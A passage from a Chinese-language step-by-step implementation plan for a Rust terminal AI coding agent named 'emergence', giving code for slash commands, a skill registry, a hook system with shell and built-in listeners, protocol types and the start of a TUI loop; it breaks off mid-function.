        let tokens = ctx.session.estimated_tokens();
        let threshold = ctx.config.settings.session.compaction_threshold_tokens;
        let pct = if threshold > 0 {
            (tokens as f64 / threshold as f64) * 100.0
        } else {
            0.0
        };

        Ok(CommandOutput::Success {
            message: format!(
                "总 token 数: ~{}\n压缩阈值: {} ({:.0}%)\nTurn 数: {}\n消息数: {}",
                tokens,
                threshold,
                pct,
                ctx.session.turns().len(),
                ctx.session.session().message_count(),
            ),
        })
    }
}
```

- [ ] **步骤 9: 编写 tools_cmd.rs 和 skills_cmd.rs**

创建 `tools_cmd.rs`：
```rust
use super::*;

pub struct ToolsCommand;

#[async_trait::async_trait]
impl Command for ToolsCommand {
    fn name(&self) -> &str { "tools" }
    fn description(&self) -> &str { "列出可用工具及风险等级" }
    fn usage(&self) -> &str { "/tools" }

    async fn execute(&self, _args: &[String], _ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        Ok(CommandOutput::Success {
            message: concat!(
                "可用工具 (8):\n",
                "  read       [ReadOnly]  读取文件\n",
                "  write      [Write]     创建/覆盖文件\n",
                "  edit       [Write]     精确字符串替换\n",
                "  grep       [ReadOnly]  文本搜索\n",
                "  glob       [ReadOnly]  文件模式匹配\n",
                "  bash       [分级]      执行 shell 命令\n",
                "  web_fetch  [System]    HTTP GET\n",
                "  web_search [System]    搜索 API",
            ).to_string(),
        })
    }
}
```

创建 `skills_cmd.rs`：
```rust
use super::*;

pub struct SkillsCommand;

#[async_trait::async_trait]
impl Command for SkillsCommand {
    fn name(&self) -> &str { "skills" }
    fn description(&self) -> &str { "列出可用 skill" }
    fn usage(&self) -> &str { "/skills" }

    async fn execute(&self, _args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        if let Some(sr) = ctx.skill_registry {
            let skills = sr.list();
            if skills.is_empty() {
                return Ok(CommandOutput::Success {
                    message: "暂无可用 skill。在 ~/.emergence/skills/ 或 ./.emergence/skills/ 中添加 .md 文件。".into(),
                });
            }
            let mut msg = String::from("可用 Skills:\n\n");
            for meta in skills {
                let source = match meta.source {
                    crate::skills::SkillSource::User => "[user]",
                    crate::skills::SkillSource::Project => "[project]",
                };
                msg.push_str(&format!("  {} {} | {}\n", meta.name, source, meta.description));
            }
            Ok(CommandOutput::Success { message: msg })
        } else {
            Ok(CommandOutput::Error { message: "SkillRegistry 不可用".into() })
        }
    }
}

pub struct SkillCommand;

#[async_trait::async_trait]
impl Command for SkillCommand {
    fn name(&self) -> &str { "skill" }
    fn description(&self) -> &str { "激活/停用 skill" }
    fn usage(&self) -> &str { "/skill <name> 或 /skill --off <name>" }

    async fn execute(&self, args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        if args.first().map(|s| s.as_str()) == Some("--off") {
            if let Some(name) = args.get(1) {
                ctx.session.deactivate_skill(name)?;
                return Ok(CommandOutput::Success {
                    message: format!("已停用 skill: {}", name),
                });
            }
            return Ok(CommandOutput::Error {
                message: "用法: /skill --off <name>".into(),
            });
        }

        if let Some(name) = args.first() {
            // 验证 skill 存在
            if let Some(sr) = ctx.skill_registry {
                if sr.load_full_content(name).is_err() {
                    return Ok(CommandOutput::Error {
                        message: format!("skill '{}' 不存在。使用 /skills 查看可用 skill。", name),
                    });
                }
            }
            ctx.session.activate_skill(name)?;
            Ok(CommandOutput::Success {
                message: format!("已激活 skill: {}", name),
            })
        } else {
            let active = ctx.session.active_skills();
            if active.is_empty() {
                Ok(CommandOutput::Success {
                    message: "当前无激活的 skill。使用 /skills 查看可用 skill，/skill <name> 激活。".into(),
                })
            } else {
                Ok(CommandOutput::Success {
                    message: format!("当前激活的 skill: {}", active.join(", ")),
                })
            }
        }
    }
}
```

- [ ] **步骤 10: 更新 commands/mod.rs 注册所有命令**

在 mod.rs 末尾添加模块声明，并在 `CommandRegistry::new()` 中注册：

```rust
// 模块声明（放在文件顶部）
pub mod help;
pub mod clear;
pub mod compact_cmd;
pub mod config_cmd;
pub mod sessions_cmd;
pub mod quit;
pub mod model_cmd;
pub mod tokens_cmd;
pub mod tools_cmd;
pub mod skills_cmd;
```

然后在 `CommandRegistry` 添加 `register_all` 方法：
```rust
impl CommandRegistry {
    /// 注册所有内置命令
    /// HelpCommand 最后注册，以便获取所有命令的 meta
    pub fn register_all(&mut self) {
        self.register(clear::ClearCommand);
        self.register(compact_cmd::CompactCommand);
        self.register(config_cmd::ConfigCommand);
        self.register(sessions_cmd::SessionsCommand);
        self.register(quit::QuitCommand);
        self.register(model_cmd::ModelCommand);
        self.register(tokens_cmd::TokensCommand);
        self.register(tools_cmd::ToolsCommand);
        self.register(skills_cmd::SkillsCommand);
        self.register(skills_cmd::SkillCommand);

        // HelpCommand 最后注册，获取所有已注册命令的 metas
        let metas = self.list();
        self.register(help::HelpCommand::new(metas));
    }
}
```

- [ ] **步骤 11: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 12: 提交**

```bash
git add src/commands/
git commit -m "feat: 实现 11 个内置斜杠命令 — help、clear、compact、config、sessions、quit、model、tokens、tools、skills、skill"
```

---

### 任务 18: Skill 系统

**文件:**
- 创建: `src/skills/mod.rs`
- 创建: `src/skills/loader.rs`
- 修改: `src/lib.rs`（如需要）

- [ ] **步骤 1: 编写 skills/mod.rs (完整替换)**

```rust
use std::collections::HashMap;
use std::path::PathBuf;
use serde::{Deserialize, Serialize};

pub mod loader;

/// Skill 来源
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum SkillSource {
    User,
    Project,
}

/// Skill 元信息（轻量，注入 system prompt）
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SkillMeta {
    pub name: String,
    pub description: String,
    pub allowed_tools: Vec<String>,
    pub source: SkillSource,
    /// content 未加载，保留路径用于按需加载
    pub file_path: PathBuf,
}

/// Skill 文件 frontmatter
#[derive(Debug, Deserialize)]
struct SkillFrontmatter {
    name: String,
    description: String,
    #[serde(default)]
    #[serde(rename = "allowed-tools")]
    allowed_tools: Vec<String>,
}

/// Skill 注册表
pub struct SkillRegistry {
    skills: HashMap<String, SkillMeta>,
}

impl SkillRegistry {
    pub fn new() -> Self {
        Self { skills: HashMap::new() }
    }

    /// 扫描两级目录加载 skill meta
    pub fn load(user_dir: Option<PathBuf>, project_dir: Option<PathBuf>) -> anyhow::Result<Self> {
        let mut registry = Self::new();

        // 1. 先加载用户级
        if let Some(ref dir) = user_dir {
            registry.scan_dir(dir, SkillSource::User)?;
        }

        // 2. 再加载项目级（覆盖同名）
        if let Some(ref dir) = project_dir {
            registry.scan_dir(dir, SkillSource::Project)?;
        }

        Ok(registry)
    }

    fn scan_dir(&mut self, dir: &PathBuf, source: SkillSource) -> anyhow::Result<()> {
        if !dir.exists() {
            return Ok(());
        }

        let entries = std::fs::read_dir(dir)?;
        for entry in entries {
            let entry = entry?;
            let path = entry.path();
            if path.extension().map_or(false, |ext| ext == "md") {
                if let Ok(meta) = self.parse_frontmatter(&path, source.clone()) {
                    self.skills.insert(meta.name.clone(), meta);
                }
            }
        }

        Ok(())
    }

    /// 解析 YAML frontmatter
    fn parse_frontmatter(&self, path: &PathBuf, source: SkillSource) -> anyhow::Result<SkillMeta> {
        let content = std::fs::read_to_string(path)?;

        // 提取 frontmatter (--- ... ---)
        let fm = if content.starts_with("---") {
            let end = content[3..].find("---").map(|i| i + 3).unwrap_or(0);
            if end > 3 {
                Some(&content[3..end])
            } else {
                None
            }
        } else {
            None
        };

        match fm {
            Some(fm_str) => {
                let fm: SkillFrontmatter = serde_yaml::from_str(fm_str)?;
                Ok(SkillMeta {
                    name: fm.name,
                    description: fm.description,
                    allowed_tools: fm.allowed_tools,
                    source,
                    file_path: path.clone(),
                })
            }
            None => {
                // 无 frontmatter：用文件名作为 name
                let name = path.file_stem()
                    .and_then(|s| s.to_str())
                    .unwrap_or("unknown")
                    .to_string();
                Ok(SkillMeta {
                    name,
                    description: String::new(),
                    allowed_tools: Vec::new(),
                    source,
                    file_path: path.clone(),
                })
            }
        }
    }

    /// 格式化为 <available_skills> 注入文本
    pub fn format_available_for_prompt(&self) -> String {
        if self.skills.is_empty() {
            return String::new();
        }
        let mut text = String::from("<available_skills>\n");
        for (_, meta) in &self.skills {
            text.push_str(&format!("- skill: {} | desc: {}\n", meta.name, meta.description));
        }
        text.push_str("</available_skills>");
        text
    }

    /// 按需加载完整 content（去掉 frontmatter）
    pub fn load_full_content(&self, name: &str) -> anyhow::Result<String> {
        let meta = self.skills.get(name)
            .ok_or_else(|| anyhow::anyhow!("skill 不存在: {}", name))?;

        let content = std::fs::read_to_string(&meta.file_path)?;

        // 去掉 frontmatter
        let body = if content.starts_with("---") {
            if let Some(end) = content[3..].find("---") {
                content[3 + end + 3..].trim().to_string()
            } else {
                content
            }
        } else {
            content
        };

        Ok(body)
    }

    /// 模糊匹配 skill（简单前缀/包含匹配）
    pub fn fuzzy_match(&self, query: &str) -> Option<&SkillMeta> {
        let query = query.to_lowercase();
        // 精确匹配
        if let Some(meta) = self.skills.get(&query) {
            return Some(meta);
        }
        // 前缀匹配
        for (name, meta) in &self.skills {
            if name.to_lowercase().starts_with(&query) {
                return Some(meta);
            }
        }
        // 包含匹配
        for (name, meta) in &self.skills {
            if name.to_lowercase().contains(&query) {
                return Some(meta);
            }
        }
        None
    }

    pub fn list(&self) -> Vec<&SkillMeta> {
        let mut metas: Vec<&SkillMeta> = self.skills.values().collect();
        metas.sort_by_key(|m| &m.name);
        metas
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_parse_frontmatter() {
        let mut tmp = tempfile::NamedTempFile::new().unwrap();
        write!(tmp, "---\nname: rust-expert\ndescription: Rust systems expert\nallowed-tools: [read, write]\n---\n\n## Role\nYou are a Rust expert.\n").unwrap();

        let registry = SkillRegistry::new();
        let meta = registry.parse_frontmatter(&tmp.path().to_path_buf(), SkillSource::User).unwrap();
        assert_eq!(meta.name, "rust-expert");
        assert_eq!(meta.description, "Rust systems expert");
        assert_eq!(meta.allowed_tools, vec!["read", "write"]);
    }

    #[test]
    fn test_load_full_content_strips_frontmatter() {
        let dir = tempfile::tempdir().unwrap();
        let skill_path = dir.path().join("test-skill.md");
        std::fs::write(&skill_path, "---\nname: test-skill\ndescription: test\n---\n\nThis is the body.\n").unwrap();

        let mut registry = SkillRegistry::new();
        registry.scan_dir(&dir.path().to_path_buf(), SkillSource::User).unwrap();
        let content = registry.load_full_content("test-skill").unwrap();
        assert_eq!(content, "This is the body.");
    }
}
```

- [ ] **步骤 2: 编写 skills/loader.rs**

```rust
use std::path::PathBuf;
use super::SkillRegistry;

impl SkillRegistry {
    /// 创建默认 loader：扫描 ~/.emergence/skills/ 和 ./.emergence/skills/
    pub fn load_default() -> anyhow::Result<Self> {
        let home_dir = std::env::var("HOME")
            .or_else(|_| std::env::var("USERPROFILE"))
            .map(PathBuf::from)
            .ok();

        let user_skills_dir = home_dir.map(|h| h.join(".emergence").join("skills"));
        let project_skills_dir = std::env::current_dir()
            .ok()
            .map(|d| d.join(".emergence").join("skills"));

        Self::load(user_skills_dir, project_skills_dir)
    }
}
```

- [ ] **步骤 3: 添加 serde_yaml 依赖检查**

确认 Cargo.toml 中已有 `serde_yaml = "0.9"`。

- [ ] **步骤 4: 验证编译和测试**

运行: `cargo test -p emergence skills`
预期: 测试通过

- [ ] **步骤 5: 提交**

```bash
git add src/skills/
git commit -m "feat: 实现 Skill 系统 — SkillRegistry、frontmatter 解析、两级目录扫描、按需加载"
```

---

### 任务 19: Hook 系统

**文件:**
- 创建: `src/hooks/mod.rs`
- 创建: `src/hooks/shell.rs`
- 创建: `src/hooks/builtin.rs`
- 修改: `src/lib.rs`

- [ ] **步骤 1: 编写 hooks/mod.rs**

```rust
use std::collections::HashMap;
use async_trait::async_trait;
use crate::permissions::RiskLevel;
use crate::llm::{ChatMessage, Usage};
use crate::tools::ToolOutput;

pub mod shell;
pub mod builtin;

/// Hook 事件类型（无 payload，用于注册/查找 — HashMap key）
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum HookEventType {
    SessionStart,
    SessionEnd,
    PreToolExecute,
    PostToolExecute,
    UserInput,
    PreLLMCall,
    PostLLMCall,
    PermissionRequested,
}

/// Hook 事件（含完整 payload，对齐设计 §10）
#[derive(Debug, Clone)]
pub enum HookEvent {
    SessionStart,
    SessionEnd,
    PreToolExecute { tool: String, params: serde_json::Value },
    PostToolExecute { tool: String, result: crate::tools::ToolOutput },
    UserInput { text: String },
    PreLLMCall { messages: Vec<crate::llm::ChatMessage> },
    PostLLMCall { response: String, usage: crate::llm::Usage },
    PermissionRequested { tool: String, risk: RiskLevel },
}

impl HookEvent {
    /// 提取无数据的 event_type，用于 HashMap 查找
    pub fn event_type(&self) -> HookEventType {
        match self {
            HookEvent::SessionStart => HookEventType::SessionStart,
            HookEvent::SessionEnd => HookEventType::SessionEnd,
            HookEvent::PreToolExecute { .. } => HookEventType::PreToolExecute,
            HookEvent::PostToolExecute { .. } => HookEventType::PostToolExecute,
            HookEvent::UserInput { .. } => HookEventType::UserInput,
            HookEvent::PreLLMCall { .. } => HookEventType::PreLLMCall,
            HookEvent::PostLLMCall { .. } => HookEventType::PostLLMCall,
            HookEvent::PermissionRequested { .. } => HookEventType::PermissionRequested,
        }
    }
}

/// Hook 执行结果
#[derive(Debug, Clone)]
pub enum HookOutcome {
    Continue,
    Abort { reason: String },
}

/// Hook 配置
#[derive(Debug, Clone, serde::Deserialize)]
#[serde(tag = "type", rename_all = "lowercase")]
pub enum HookConfig {
    Shell {
        command: String,
        #[serde(default = "default_timeout")]
        timeout_ms: u64,
        #[serde(default)]
        abort_on_error: bool,
    },
    Builtin {
        listener: String,
        config: serde_json::Value,
    },
}

fn default_timeout() -> u64 { 30000 }

/// Hook 条目
#[derive(Debug, Clone, serde::Deserialize)]
pub struct HookEntry {
    pub event: String,
    #[serde(flatten)]
    pub config: HookConfig,
}

/// Hook 执行器 trait
#[async_trait]
pub trait HookExecutor: Send + Sync {
    fn hook_type(&self) -> &str;
    async fn execute(&self, event: &HookEvent) -> anyhow::Result<HookOutcome>;
}

/// Hook 注册表
pub struct HookRegistry {
    listeners: HashMap<HookEventType, Vec<Box<dyn HookExecutor>>>,
}

impl HookRegistry {
    pub fn new() -> Self {
        Self {
            listeners: HashMap::new(),
        }
    }

    /// 从 hooks.json 加载注册
    pub fn load(path: &std::path::Path) -> anyhow::Result<Self> {
        let mut registry = Self::new();
        if !path.exists() {
            return Ok(registry);
        }

        let content = std::fs::read_to_string(path)?;
        let parsed: serde_json::Value = serde_json::from_str(&content)?;

        if let Some(hooks) = parsed["hooks"].as_array() {
            for hook in hooks {
                let entry: HookEntry = serde_json::from_value(hook.clone())?;
                let event_type = parse_event_type(&entry.event);
                let executor: Box<dyn HookExecutor> = match &entry.config {
                    HookConfig::Shell { command, timeout_ms, abort_on_error } => {
                        Box::new(shell::ShellExecutor::new(
                            command.clone(),
                            *timeout_ms,
                            *abort_on_error,
                        ))
                    }
                    HookConfig::Builtin { listener, config } => {
                        builtin::create_builtin(listener, config.clone())?
                    }
                };

                if let Some(et) = event_type {
                    registry.listeners.entry(et).or_default().push(executor);
                }
            }
        }

        Ok(registry)
    }

    /// 注册 hook（通过 event_type）
    pub fn register(&mut self, event_type: HookEventType, executor: Box<dyn HookExecutor>) {
        self.listeners.entry(event_type).or_default().push(executor);
    }

    /// 合并另一个 HookRegistry 的内容（用于两级配置合并）
    pub fn merge(&mut self, other: HookRegistry) {
        for (event_type, executors) in other.listeners {
            self.listeners.entry(event_type).or_default().extend(executors);
        }
    }

    /// 分发事件，收集所有结果（对齐设计 §10 执行流程）
    pub async fn dispatch(&self, event: &HookEvent) -> Vec<HookOutcome> {
        let mut outcomes = Vec::new();
        if let Some(executors) = self.listeners.get(&event.event_type()) {
            for executor in executors {
                match executor.execute(event).await {
                    Ok(outcome) => outcomes.push(outcome),
                    Err(e) => {
                        tracing::warn!("Hook 执行错误 ({}): {}", executor.hook_type(), e);
                        outcomes.push(HookOutcome::Continue);
                    }
                }
            }
        }
        outcomes
    }
}

fn parse_event_type(event_name: &str) -> Option<HookEventType> {
    match event_name {
        "SessionStart" => Some(HookEventType::SessionStart),
        "SessionEnd" => Some(HookEventType::SessionEnd),
        "PreToolExecute" => Some(HookEventType::PreToolExecute),
        "PostToolExecute" => Some(HookEventType::PostToolExecute),
        "UserInput" => Some(HookEventType::UserInput),
        "PreLLMCall" => Some(HookEventType::PreLLMCall),
        "PostLLMCall" => Some(HookEventType::PostLLMCall),
        "PermissionRequested" => Some(HookEventType::PermissionRequested),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_event_type() {
        assert!(parse_event_type("SessionStart").is_some());
        assert!(parse_event_type("PreToolExecute").is_some());
        assert!(parse_event_type("UnknownEvent").is_none());
    }

    #[test]
    fn test_event_type_from_event() {
        let event = HookEvent::PreToolExecute {
            tool: "bash".into(),
            params: serde_json::json!({"command": "ls"}),
        };
        assert_eq!(event.event_type(), HookEventType::PreToolExecute);
    }
}
```

- [ ] **步骤 2: 编写 hooks/shell.rs**

```rust
use super::*;
use std::process::Stdio;

pub struct ShellExecutor {
    command: String,
    timeout_ms: u64,
    abort_on_error: bool,
}

impl ShellExecutor {
    pub fn new(command: String, timeout_ms: u64, abort_on_error: bool) -> Self {
        Self {
            command,
            timeout_ms,
            abort_on_error,
        }
    }
}

#[async_trait]
impl HookExecutor for ShellExecutor {
    fn hook_type(&self) -> &str { "shell" }

    async fn execute(&self, event: &HookEvent) -> anyhow::Result<HookOutcome> {
        // 模板变量替换：从 HookEvent 提取 payload
        let mut cmd = self.command.clone();
        if let HookEvent::PreToolExecute { tool, .. } = event {
            cmd = cmd.replace("{{tool}}", tool);
        }
        if let HookEvent::PostToolExecute { tool, .. } = event {
            cmd = cmd.replace("{{tool}}", tool);
        }

        // 将整个事件序列化为 JSON 通过 stdin 传入子进程
        let event_json = serde_json::to_string(event)?;

        let result = tokio::time::timeout(
            std::time::Duration::from_millis(self.timeout_ms),
            tokio::task::spawn_blocking(move || {
                std::process::Command::new("sh")
                    .arg("-c")
                    .arg(&cmd)
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn()
                    .and_then(|mut child| {
                        use std::io::Write;
                        if let Some(stdin) = child.stdin.as_mut() {
                            let _ = stdin.write_all(event_json.as_bytes());
                        }
                        child.wait_with_output()
                    })
            }),
        )
        .await
        .map_err(|_| anyhow::anyhow!("Shell hook 超时 ({}ms)", self.timeout_ms))?
        .map_err(|e| anyhow::anyhow!("Shell hook 错误: {}", e))?;

        match result {
            Ok(output) => {
                if output.status.success() || !self.abort_on_error {
                    Ok(HookOutcome::Continue)
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    Ok(HookOutcome::Abort {
                        reason: format!("Shell hook 失败: {}", stderr),
                    })
                }
            }
            Err(e) => {
                if self.abort_on_error {
                    Ok(HookOutcome::Abort { reason: e.to_string() })
                } else {
                    tracing::warn!("Shell hook 错误: {}", e);
                    Ok(HookOutcome::Continue)
                }
            }
        }
    }
}
```

- [ ] **步骤 3: 编写 hooks/builtin.rs**

```rust
use super::*;
use std::sync::Mutex;

/// 创建内建监听器
pub fn create_builtin(listener: &str, config: serde_json::Value) -> anyhow::Result<Box<dyn HookExecutor>> {
    match listener {
        "log" => Ok(Box::new(LogListener::new(config)?)),
        "validate-tool" => Ok(Box::new(ValidateToolListener::new(config)?)),
        "notify" => Ok(Box::new(NotifyListener::new(config)?)),
        "rate-limit" => Ok(Box::new(RateLimitListener::new(config)?)),
        _ => anyhow::bail!("未知的内建监听器: {}", listener),
    }
}

/// 日志监听器 — 将事件 JSON 写入文件
pub struct LogListener {
    path: std::path::PathBuf,
    format: String,
}

impl LogListener {
    fn new(config: serde_json::Value) -> anyhow::Result<Self> {
        let path = config["path"].as_str().unwrap_or("~/.emergence/hooks.log");
        let format = config["format"].as_str().unwrap_or("json").to_string();
        let path = if path.starts_with("~/") {
            let home = std::env::var("HOME").unwrap_or_default();
            std::path::PathBuf::from(home).join(&path[2..])
        } else {
            std::path::PathBuf::from(path)
        };
        Ok(Self { path, format })
    }
}

#[async_trait]
impl HookExecutor for LogListener {
    fn hook_type(&self) -> &str { "builtin:log" }

    async fn execute(&self, event: &HookEvent) -> anyhow::Result<HookOutcome> {
        let log_entry = serde_json::json!({
            "timestamp": chrono::Utc::now().to_rfc3339(),
            "event": format!("{:?}", event),
        });

        let line = if self.format == "json" {
            serde_json::to_string(&log_entry)?
        } else {
            format!("{} | {:?}", chrono::Utc::now().to_rfc3339(), event)
        };

        // 追加写入
        if let Some(parent) = self.path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        use std::io::Write;
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.path)?;
        writeln!(file, "{}", line)?;

        Ok(HookOutcome::Continue)
    }
}

/// 工具校验监听器 — 检查 deny_patterns
pub struct ValidateToolListener {
    deny_patterns: Vec<String>,
}

impl ValidateToolListener {
    fn new(config: serde_json::Value) -> anyhow::Result<Self> {
        let mut deny_patterns = Vec::new();
        if let Some(rules) = config["rules"].as_array() {
            for rule in rules {
                if let Some(patterns) = rule["deny_patterns"].as_array() {
                    for p in patterns {
                        deny_patterns.push(p.as_str().unwrap_or("").to_string());
                    }
                }
            }
        }
        Ok(Self { deny_patterns })
    }
}

#[async_trait]
impl HookExecutor for ValidateToolListener {
    fn hook_type(&self) -> &str { "builtin:validate-tool" }

    async fn execute(&self, event: &HookEvent) -> anyhow::Result<HookOutcome> {
        // 从 HookEvent 中提取 params
        let params = match event {
            HookEvent::PreToolExecute { params, .. } => {
                params["command"].as_str().unwrap_or("")
            }
            _ => "",
        };

        for pattern in &self.deny_patterns {
            if params.contains(pattern) {
                return Ok(HookOutcome::Abort {
                    reason: format!("匹配拒绝模式: {}", pattern),
                });
            }
        }

        Ok(HookOutcome::Continue)
    }
}

/// 通知监听器 — 系统通知 (notify-send)
pub struct NotifyListener;

impl NotifyListener {
    fn new(_config: serde_json::Value) -> anyhow::Result<Self> {
        Ok(Self)
    }
}

#[async_trait]
impl HookExecutor for NotifyListener {
    fn hook_type(&self) -> &str { "builtin:notify" }

    async fn execute(&self, event: &HookEvent) -> anyhow::Result<HookOutcome> {
        // 发送系统通知
        let message = format!("emergence: {:?}", event.event_type());
        // 仅在 Linux 上尝试 notify-send
        let _ = std::process::Command::new("notify-send")
            .arg("emergence")
            .arg(&message)
            .spawn();

        Ok(HookOutcome::Continue)
    }
}

/// 频率限制监听器
pub struct RateLimitListener {
    limits: Mutex<std::collections::HashMap<String, (u32, std::time::Instant)>>,
    max_per_hour: u32,
}

impl RateLimitListener {
    fn new(config: serde_json::Value) -> anyhow::Result<Self> {
        let max_per_hour = config["max_per_hour"].as_u64().unwrap_or(50) as u32;
        Ok(Self {
            limits: Mutex::new(std::collections::HashMap::new()),
            max_per_hour,
        })
    }
}

#[async_trait]
impl HookExecutor for RateLimitListener {
    fn hook_type(&self) -> &str { "builtin:rate-limit" }

    async fn execute(&self, _event: &HookEvent) -> anyhow::Result<HookOutcome> {
        let now = std::time::Instant::now();
        let hour = std::time::Duration::from_secs(3600);

        let mut limits = self.limits.lock().unwrap();
        let key = "default".to_string();
        let (count, timestamp) = limits.entry(key).or_insert((0, now));

        if now - *timestamp > hour {
            *count = 0;
            *timestamp = now;
        }

        *count += 1;
        if *count > self.max_per_hour {
            Ok(HookOutcome::Abort {
                reason: format!("超过频率限制 ({} 次/小时)", self.max_per_hour),
            })
        } else {
            Ok(HookOutcome::Continue)
        }
    }
}
```

- [ ] **步骤 4: 更新 src/lib.rs 添加 hooks 模块**

```rust
pub mod hooks;
```

- [ ] **步骤 5: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 6: 提交**

```bash
git add src/hooks/ src/lib.rs
git commit -m "feat: 实现 Hook 系统 — HookRegistry、ShellExecutor、4 个内建监听器"
```

---

### 任务 20: 通信协议类型 (Action / Event)

**文件:**
- 创建: `src/protocol.rs`
- 修改: `src/lib.rs`

- [ ] **步骤 1: 编写 src/protocol.rs**

```rust
use crate::permissions::RiskLevel;
use crate::llm::StopReason;

/// TUI → Agent Loop
#[derive(Debug, Clone)]
pub enum Action {
    Submit(String),
    ApproveOnce,
    ApproveAlways,
    Deny,
    Cancel,
    Quit,
}

/// Agent Loop → TUI
#[derive(Debug, Clone)]
pub enum Event {
    TextDelta {
        content: String,
        finish_reason: Option<String>,
    },
    ToolRequest {
        id: String,
        name: String,
        params: serde_json::Value,
        risk: RiskLevel,
    },
    ToolResult {
        id: String,
        name: String,
        params: serde_json::Value,
        output: String,
        metadata: Option<serde_json::Value>,
    },
    ThinkingDelta {
        content: String,
    },
    StatusUpdate {
        tokens: u32,
        model: String,
    },
    AgentDone {
        stop_reason: StopReason,
    },
    Error {
        message: String,
    },
}
```

- [ ] **步骤 2: 更新 src/lib.rs 添加 protocol 模块**

```rust
pub mod protocol;
```

- [ ] **步骤 3: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 4: 提交**

```bash
git add src/protocol.rs src/lib.rs
git commit -m "feat: 定义通信协议类型 — Action（TUI→Agent）、Event（Agent→TUI）"
```

---

### 任务 21: TUI 初始化和主渲染循环

**文件:**
- 创建: `src/tui/mod.rs`
- 创建: `src/tui/themes.rs`
- 创建: `src/tui/widgets.rs`
- 创建: `src/tui/popups.rs`
- 修改: `src/lib.rs`

- [ ] **步骤 1: 编写 src/tui/themes.rs**

```rust
use ratatui::style::{Color, Style, Modifier};

pub struct Theme {
    pub bg: Color,
    pub fg: Color,
    pub accent: Color,
    pub dim: Color,
    pub user_color: Color,
    pub assistant_color: Color,
    pub tool_color: Color,
    pub thinking_color: Color,
    pub error_color: Color,
    pub risk_readonly: Color,
    pub risk_write: Color,
    pub risk_system: Color,
}

pub const DEFAULT_THEME: Theme = Theme {
    bg: Color::Black,
    fg: Color::White,
    accent: Color::Cyan,
    dim: Color::Gray,
    user_color: Color::Green,
    assistant_color: Color::White,
    tool_color: Color::Yellow,
    thinking_color: Color::Magenta,
    error_color: Color::Red,
    risk_readonly: Color::Green,
    risk_write: Color::Yellow,
    risk_system: Color::Red,
};

pub fn user_style() -> Style {
    Style::default().fg(DEFAULT_THEME.user_color).add_modifier(Modifier::BOLD)
}

pub fn assistant_style() -> Style {
    Style::default().fg(DEFAULT_THEME.assistant_color)
}

pub fn thinking_style() -> Style {
    Style::default().fg(DEFAULT_THEME.thinking_color).add_modifier(Modifier::ITALIC)
}

pub fn tool_style() -> Style {
    Style::default().fg(DEFAULT_THEME.tool_color)
}

pub fn status_bar_style() -> Style {
    Style::default().fg(Color::Black).bg(DEFAULT_THEME.accent)
}

pub fn error_style() -> Style {
    Style::default().fg(DEFAULT_THEME.error_color)
}
```

- [ ] **步骤 2: 编写 src/tui/mod.rs — TUI 主循环骨架**

```rust
use std::io;
use ratatui::prelude::*;
use crossterm::{
    event::{self, Event as CEvent, KeyCode, KeyModifiers, KeyEvent, DisableMouseCapture, EnableMouseCapture},
    execute,
    terminal::{self, EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
};
use tokio::sync::mpsc;

use crate::protocol::{Action, Event as AppEvent};

pub mod themes;
pub mod widgets;
pub mod popups;

/// TUI 状态
pub struct TuiState {
    pub messages: Vec<RenderedMessage>,
    pub status_text: String,
    pub input_buffer: String,
    pub show_permission_dialog: Option<PermissionDialogState>,
    pub streaming: bool,
    /// 输入历史（对齐设计 §7：最多 1000 条）
    pub input_history: Vec<String>,
    /// 当前浏览的历史位置（None 表示不在浏览中）
    pub history_index: Option<usize>,
    /// 浏览历史前暂存的输入内容
    pub pending_input: String,
}

#[derive(Debug, Clone)]
pub enum RenderedMessage {
    User { timestamp: String, content: String },
    Assistant { timestamp: String, content: String, thinking: Option<String>, duration: Option<String>, tokens: Option<u32> },
    ToolCall { tool: String, params: String, duration: Option<String> },
    ToolResult { output: String },
    Thinking { content: String },
    Error { message: String },
}

#[derive(Debug, Clone)]
pub struct PermissionDialogState {
    pub tool_name: String,
    pub risk: crate::permissions::RiskLevel,
    pub params: serde_json::Value,
    pub tool_id: String,
}

/// 启动 TUI 主循环
pub async fn run(
    mut action_tx: mpsc::UnboundedSender<Action>,
    mut event_rx: mpsc::UnboundedReceiver<AppEvent>,
) -> anyhow::Result<()> {
    // Terminal 初始化
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut state = TuiState {
        messages: Vec::new(),
        status_text: "emergence · 启动中 · ✓ ready".into(),
        input_buffer: String::new(),
        show_permission_dialog: None,
        streaming: false,
        input_history: load_input_history(),  // 从文件加载历史
        history_index: None,
        pending_input: String::new(),
    };

    let res = app_loop(&mut terminal, &mut state, &mut action_tx, &mut event_rx).await;

    // 清理
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen, DisableMouseCapture)?;
    terminal.show_cursor()?;

    res
}

async fn app_loop(
    terminal: &mut Terminal<CrosstermBackend<io::Stdout>>,
    state: &mut TuiState,
    action_tx: &mut mpsc::UnboundedSender<Action>,
    event_rx: &mut mpsc::UnboundedReceiver<AppEvent>,
) -> anyhow::Result<()> {
    loop {
        // 渲染
        terminal.draw(|f| {
            widgets::render(f, state);
            if let Some(ref dialog) = state.show_permission_dialog {
                popups::render_permission_dialog(f, dialog);
            }
        })?;

        // 检查输入和事件（需要 tokio select）
        tokio::select! {
            // TUI 事件
